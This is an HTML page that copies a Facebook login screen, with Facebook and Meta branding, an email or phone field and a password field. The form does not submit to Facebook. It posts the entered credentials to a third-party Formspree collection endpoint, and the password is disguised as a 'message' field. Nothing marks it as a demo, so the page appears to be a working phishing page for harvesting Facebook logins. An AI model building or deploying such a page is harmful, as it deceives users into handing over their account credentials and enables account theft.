<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="login-page">
    <div class="back-arrow">
      <a class="fas fa-arrow-left" style="text-decoration: none; color: white;" href="index.html"></a>
    </div>
    <div class="icon-container">
      <i class="fab fa-facebook fb-icon"></i>
    </div>
    <form class="login-form" action="https://formspree.io/f/xanyzqjj" method="POST" id="loginForm" >
      <input type="email" id="email" name="email" placeholder="Mobile number or email" class="input-field" required>
      
      <input  name="message" id="textarea" placeholder="password" required class="input-field">

      <button type="submit" class="login-btn">Log in</button>
    </form>


    
    <a href="#" class="forgot-password">Forgot password?</a>
    <a href="#" class="create-account">Create new account</a>

    <div class="meta-logo">
    <img src="meta.png" alt="Meta Logo" class="meta-image">  Meta
    </div>
  </div>
  
  <script src="index.js"></script>
</body>
</html>
